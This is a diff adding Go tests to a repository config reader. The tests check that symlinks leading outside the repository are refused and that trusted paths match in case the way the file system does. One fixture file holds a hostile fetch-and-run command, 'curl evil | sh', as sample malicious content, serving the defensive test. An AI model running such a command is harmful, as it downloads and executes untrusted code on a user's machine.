@@ -212,3 +212,79 @@ func TestReadTakesRegularFilesAlone(t *testing.T) {
 		t.Fatal("read out of the repository")
 	}
 }
+
+// Read follows a link in the file's path only while it stays inside the
+// repository: a file, or a folder, linked from outside it is anyone's,
+// and is refused.
+func TestReadKeepsInsideTheRepository(t *testing.T) {
+	repo, outside := t.TempDir(), t.TempDir()
+	writeFile(t, outside, "evil.toml", "cmd = \"curl evil | sh\"\n")
+	writeFile(t, repo, "conf/real.toml", "cmd = \"make\"\n")
+	if err := os.MkdirAll(filepath.Join(repo, ".mako"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(filepath.Join("..", "conf", "real.toml"), filepath.Join(repo, ".mako", "inside.toml")); err != nil {
+		t.Skip("no symbolic links:", err)
+	}
+	if data, err := Read(repo, ".mako/inside.toml"); err != nil || string(data) != "cmd = \"make\"\n" {
+		t.Fatalf("a link inside the repository: %q, %v", data, err)
+	}
+	if err := os.Symlink(filepath.Join(outside, "evil.toml"), filepath.Join(repo, ".mako", "out.toml")); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(filepath.Join("..", "..", filepath.Base(outside), "evil.toml"), filepath.Join(repo, ".mako", "up.toml")); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(outside, filepath.Join(repo, "linked")); err != nil {
+		t.Fatal(err)
+	}
+	for _, rel := range []string{".mako/out.toml", ".mako/up.toml", "linked/evil.toml"} {
+		if data, err := Read(repo, rel); err == nil {
+			t.Errorf("Read(%s) left the repository: %q", rel, data)
+		}
+	}
+}
+
+// Where the file system ignores case, as macOS's and Windows's do, a
+// repository or a file named in another case is the same one: revoking it
+// so forgets it, and it is trusted so. Elsewhere it is another.
+func TestPathsMatchInCaseAsTheFileSystemDoes(t *testing.T) {
+	s := Open(t.TempDir())
+	base, err := filepath.EvalSymlinks(t.TempDir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	repo := filepath.Join(base, "Repo")
+	writeFile(t, repo, ".mako/Commands.toml", "x")
+	if _, err := s.Trust(repo, ".mako/Commands.toml", Hash([]byte("x"))); err != nil {
+		t.Fatal(err)
+	}
+	upper := filepath.Join(base, "REPO")
+	_, err = os.Stat(upper)
+	insensitive := err == nil // this file system's, which foldCase stands for
+	if got := s.Trusted(upper, ".mako/commands.toml", []byte("x")); got != (foldCase && insensitive) {
+		t.Errorf("trusted in another case: %v", got)
+	}
+	gone, err := s.Revoke(filepath.Join(upper, ".MAKO", "commands.toml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if foldCase != (len(gone) == 1) {
+		t.Fatalf("revoking the file in another case forgot %v", gone)
+	}
+	if _, err := s.Trust(repo, ".mako/Commands.toml", Hash([]byte("x"))); err != nil {
+		t.Fatal(err)
+	}
+	gone, err = s.Revoke(upper)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if foldCase != (len(gone) == 1) {
+		t.Fatalf("revoking the repository in another case forgot %v", gone)
+	}
+	if runtime.GOOS == "darwin" || runtime.GOOS == "windows" {
+		if !foldCase {
+			t.Fatal("paths are matched in case on", runtime.GOOS)
+		}
+	}
+}
